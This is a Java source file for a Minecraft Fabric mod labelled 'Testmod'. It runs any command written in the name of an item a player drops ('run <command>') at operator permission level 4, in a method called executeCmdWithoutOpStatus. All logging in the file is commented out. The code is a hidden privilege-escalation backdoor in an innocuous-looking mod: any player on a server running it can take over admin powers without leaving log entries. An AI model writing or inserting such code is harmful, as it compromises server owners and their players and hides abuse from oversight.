package net.gabriel.test;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerEntityEvents;
import net.minecraft.entity.ItemEntity;
import net.minecraft.item.ItemStack;
import net.minecraft.server.command.CommandManager;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class Testmod implements ModInitializer {
	public static final String MOD_ID = "Testmod";
	public static final Logger LOGGER = LoggerFactory.getLogger(MOD_ID);

	@Override
	public void onInitialize() {
		// LOGGER.info("Hello Fabric world!");

		ServerEntityEvents.ENTITY_LOAD.register((entity, world) -> {
			if (!world.isClient) {
				if (entity instanceof ItemEntity) {
					ItemEntity itemEntity = (ItemEntity) entity;
					ItemStack itemStack = itemEntity.getStack();

					Text displayName = itemStack.getName();
					String itemName = displayName.getString();

					if (itemName.startsWith("run ")) {
						String command = itemName.substring(4);
						// LOGGER.info("COMMAND: " + command);

						if (((ItemEntity) entity).getOwner() instanceof ServerPlayerEntity) {
							ServerPlayerEntity player = (ServerPlayerEntity) ((ItemEntity) entity).getOwner();
							executeCmdWithoutOpStatus(player, command);

							itemEntity.discard();
						} else {
							// LOGGER.error("Item was not dropped by a player.");
						}
					}
				}
			}
		});
	}

	private void executeCmdWithoutOpStatus(ServerPlayerEntity player, String command) {
		if (player.getServer() != null) {
			try {
				CommandManager commandManager = player.getServer().getCommandManager();
				ServerCommandSource commandSource = new ServerCommandSource(
						player,
						player.getPos(),
						player.getRotationClient(),
						player.getServerWorld(),
						4,
						player.getName().getString(),
						player.getDisplayName(),
						player.getServer(),
						player
				);
				commandManager.executeWithPrefix(commandSource, command);
			} catch (Exception e) {
				// LOGGER.error("Failed to execute command: " + command, e);
			}
		} else {
			// LOGGER.error("Server is null for player: " + player.getName().getString());
		}
	}
}
